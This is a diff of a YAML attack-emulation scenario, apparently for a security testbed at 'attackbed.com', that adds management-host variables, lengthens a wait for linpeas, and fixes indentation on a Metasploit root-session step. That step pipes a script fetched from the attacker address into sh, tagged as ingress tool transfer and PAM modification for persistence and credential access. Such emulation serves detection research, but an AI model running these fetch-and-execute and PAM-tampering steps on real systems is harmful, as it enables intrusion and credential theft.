@@ -1,12 +1,15 @@
 ####################
 #
-# Scenario 1 e a
+# Scenario 1 e c
 #
 ####################
 vars:
   $SERVER_ADDRESS: video.attackbed.com
   $ATTACKER_ADDRESS: 192.42.1.174
   $DNS_SERVER: 192.42.0.233
+  $ADMIN_SERVER: 10.12.0.222
+  $MGMT_IP: 192.42.0.201
+  $MGMT_USERNAME: aecid
   $DOMAIN: attackbed.com
   $USER: aecid
   $DNS_LIST: /usr/local/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
@@ -136,7 +139,7 @@ commands:
 
   # wait a little bit for linpeas
   - type: sleep
-    seconds: 380
+    seconds: 600
 
   # This command fixes the outputbuffer
   # so that the output of the further
@@ -234,7 +237,7 @@ commands:
   - type: msf-session
     session: "root"
     cmd: "curl http://$ATTACKER_ADDRESS/README.txt.5 | sh"
-     metadata:
+    metadata:
       techniques: "T1105,T1556.003"
       tactics: "Command and Control,Persistence,Credential Access"
       technique_name:"Ingress Tool Transfer,Modify Authentication Process: Pluggable Authentication Modules"
